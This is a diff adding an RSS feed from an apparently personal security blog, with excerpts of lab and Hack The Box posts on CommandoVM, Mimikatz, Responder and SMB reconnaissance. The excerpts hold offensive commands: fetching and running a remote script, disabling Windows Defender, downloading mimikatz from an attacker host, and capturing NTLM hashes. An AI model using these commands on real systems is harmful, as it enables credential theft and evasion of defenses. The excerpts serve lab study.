@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>smb on Poney Island</title>
+    <link>https://0xade1.github.io/devdraft/tags/smb/</link>
+    <description>Recent content in smb on Poney Island</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 05 May 2020 00:54:12 +0800</lastBuildDate><atom:link href="https://0xade1.github.io/devdraft/tags/smb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CommandoVM Preparation</title>
+      <link>https://0xade1.github.io/devdraft/posts/2020/05/commandovm-preparation/</link>
+      <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
+      
+      <guid>https://0xade1.github.io/devdraft/posts/2020/05/commandovm-preparation/</guid>
+      <description>prepare your windowsVM  Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender  https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html   Reboot Snapshot your VM : &amp;ldquo;Before-Commando-VM&amp;rdquo;  1  Set-ExecutionPolicy Unrestricted   Install CommandoVM  Download and Execute Commander VM by Mandiant  1  IEX(new-object net.webclient).downloadstring(&amp;#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&amp;#39;)   Failed to install 1 2  cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.</description>
+    </item>
+    
+    <item>
+      <title>Mimikatz</title>
+      <link>https://0xade1.github.io/devdraft/posts/2020/05/mimikatz/</link>
+      <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
+      
+      <guid>https://0xade1.github.io/devdraft/posts/2020/05/mimikatz/</guid>
+      <description>Identification of the processor architecture
+1 2  PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64   Upload mimikatz
+1 2 3  wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/   We download Mimikatz and execute after having disabled Windows Defender
+1 2 3  PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit   output:
+ .#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .</description>
+    </item>
+    
+    <item>
+      <title>Responder</title>
+      <link>https://0xade1.github.io/devdraft/posts/2020/05/responder/</link>
+      <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
+      
+      <guid>https://0xade1.github.io/devdraft/posts/2020/05/responder/</guid>
+      <description>Installation My docker environment do not have access to utun4 Kali Responder
+1 2 3 4 5  git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events...   Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
+1  Get-Content \\10.10.14.73\randomFileName   Responder will intercept the following hash
+1 2 3 4 5 6  [+] Listening for events.</description>
+    </item>
+    
+    <item>
+      <title>HTB - Legacy</title>
+      <link>https://0xade1.github.io/devdraft/posts/2020/04/htb-legacy/</link>
+      <pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate>
+      
+      <guid>https://0xade1.github.io/devdraft/posts/2020/04/htb-legacy/</guid>
+      <description>Reconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  # Nmap 7.60 scan initiated Fri Feb 21 02:26:34 2020 as: nmap -Pn -sC -sV -oA nmap/legacy 10.10.10.4 Nmap scan report for 10.10.10.4 Host is up (0.24s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d01h59m29s, deviation: 0s, median: 5d01h59m29s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:65:1e (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\x00 | Workgroup: HTB\x00 |_ System time: 2020-02-26T06:27:07+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed.</description>
+    </item>
+    
+    <item>
+      <title>HTB - Re</title>
+      <link>https://0xade1.github.io/devdraft/posts/2020/02/htb-re/</link>
+      <pubDate>Thu, 20 Feb 2020 00:54:12 +0800</pubDate>
+      
+      <guid>https://0xade1.github.io/devdraft/posts/2020/02/htb-re/</guid>
+      <description>RECONNAISSANCE Only two ports open: http 80 and smb 445
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # Nmap 7.60 scan initiated Mon Feb 10 13:23:35 2020 as: nmap -sC -sV -oA nmap/RE 10.10.10.144 Nmap scan report for re.htb (10.10.10.144) Host is up (0.16s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.</description>
+    </item>
+    
+  </channel>
+</rss>
